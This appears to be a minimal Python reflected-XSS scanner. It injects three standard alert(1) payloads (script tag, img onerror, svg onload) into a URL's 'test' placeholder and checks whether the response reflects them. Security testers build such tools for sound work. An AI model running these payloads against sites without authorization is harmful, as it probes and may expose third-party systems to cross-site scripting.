import requests

# Basic payloads (expand later)
PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

def scan(url: str):
    """
    Test the given URL for reflected XSS vulnerabilities.
    """

    print(f"[INFO] Starting XSS scan on: {url}")

    for payload in PAYLOADS:
        # Replace 'test' placeholder with payload (simple injection method)
        test_url = url.replace("test", payload)

        try:
            response = requests.get(test_url, timeout=5)

            if payload in response.text:
                print(f"[VULNERABLE] Possible XSS detected with payload: {payload}")
            else:
                print(f"[OK] No reflection for payload: {payload}")
        #failure
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed for payload {payload}: {e}")

    print("[INFO] XSS scan complete.")
